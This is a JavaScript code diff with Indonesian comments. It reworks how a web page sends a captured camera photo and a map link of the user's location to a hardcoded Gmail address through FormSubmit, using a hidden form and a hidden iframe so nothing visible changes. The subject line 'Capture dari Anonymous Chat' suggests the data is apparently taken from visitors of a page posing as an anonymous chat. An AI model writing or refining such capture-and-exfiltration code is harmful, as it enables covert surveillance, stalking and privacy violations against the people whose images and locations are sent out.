@@ -270,26 +270,67 @@
                         return;
                     }
 
-                    // 4. Kirim ke FormSubmit
-                    const formData = new FormData();
-                    formData.append('message', `Lokasi: ${mapLink}\nWaktu: ${new Date().toISOString()}`);
-                    formData.append('attachment', blob, 'capture.jpg'); // Nama field 'attachment' penting
-
+                    // 4. Kirim ke FormSubmit sebagai form multipart.
+                    // FormSubmit mendukung attachment secara native melalui
+                    // enctype="multipart/form-data". Jangan gunakan endpoint AJAX
+                    // untuk file karena dokumentasi AJAX-nya menggunakan JSON.
                     try {
-                        const response = await fetch('https://formsubmit.co/ajax/desamuncrat477@gmail.com', {
-                            method: 'POST',
-                            body: formData
-                        });
+                        const form = document.createElement('form');
+                        form.method = 'POST';
+                        form.action = 'https://formsubmit.co/desamuncrat477@gmail.com';
+                        form.enctype = 'multipart/form-data';
+                        form.target = 'formsubmit_iframe';
+                        form.style.display = 'none';
 
-                        if (response.ok) {
-                            status.innerHTML = '✅ TERKIRIM! Cek email/spam Anda.';
-                            btn.innerText = 'DONE';
-                        } else {
-                            status.innerHTML = '❌ Gagal kirim (Cek Console)';
-                            btn.disabled = false;
+                        const message = document.createElement('textarea');
+                        message.name = 'message';
+                        message.value =
+                            `Lokasi: ${mapLink}\nWaktu: ${new Date().toISOString()}`;
+                        form.appendChild(message);
+
+                        const subject = document.createElement('input');
+                        subject.type = 'hidden';
+                        subject.name = '_subject';
+                        subject.value = 'Capture dari Anonymous Chat';
+                        form.appendChild(subject);
+
+                        const attachment = document.createElement('input');
+                        attachment.type = 'file';
+                        attachment.name = 'attachment';
+                        attachment.accept = 'image/jpeg,image/png';
+
+                        // Masukkan Blob hasil kamera ke input file.
+                        const file = new File([blob], 'capture.jpg', {
+                            type: 'image/jpeg',
+                            lastModified: Date.now()
+                        });
+                        const dataTransfer = new DataTransfer();
+                        dataTransfer.items.add(file);
+                        attachment.files = dataTransfer.files;
+                        form.appendChild(attachment);
+
+                        // Iframe tersembunyi agar halaman tidak berpindah.
+                        let iframe = document.getElementById('formsubmit_iframe');
+                        if (!iframe) {
+                            iframe = document.createElement('iframe');
+                            iframe.id = 'formsubmit_iframe';
+                            iframe.name = 'formsubmit_iframe';
+                            iframe.style.display = 'none';
+                            document.body.appendChild(iframe);
                         }
+
+                        document.body.appendChild(form);
+                        form.submit();
+
+                        status.innerHTML =
+                            '✅ Foto sedang dikirim. Periksa inbox/spam email.';
+                        btn.innerText = 'TERKIRIM';
+                        btn.disabled = true;
+
+                        // Bersihkan form setelah dikirim.
+                        setTimeout(() => form.remove(), 3000);
                     } catch (error) {
-                        status.innerHTML = '❌ Error Jaringan';
+                        status.innerHTML = '❌ Gagal menyiapkan pengiriman';
                         console.error(error);
                         btn.disabled = false;
                     }
